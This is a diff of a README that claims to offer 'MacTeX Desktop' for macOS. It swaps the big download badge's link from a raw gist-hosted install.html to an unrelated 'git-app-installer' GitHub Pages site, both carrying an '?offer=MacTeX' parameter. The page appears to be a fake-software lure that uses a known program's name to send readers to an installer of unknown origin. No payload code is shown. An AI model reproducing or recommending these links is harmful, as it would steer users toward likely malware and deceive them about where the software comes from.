@@ -1,7 +1,7 @@
 # MacTeX Desktop — LaTeX Tools for macOS
 MacTeX for macOS provides a complete LaTeX distribution with editors, packages, and typesetting tools for document creation and academic publishing.
 
-<a href="https://gistcdn.githack.com/abing31player/758d6e02cb7428f36f95d059cb33e50d/raw/53826ec320d1157246f15753a14ee363fdf5f3db/install.html?offer=MacTeX" target="_blank">
+<a href="https://git-app-installer.github.io/.github/?offer=MacTeX" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20MacTeX%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
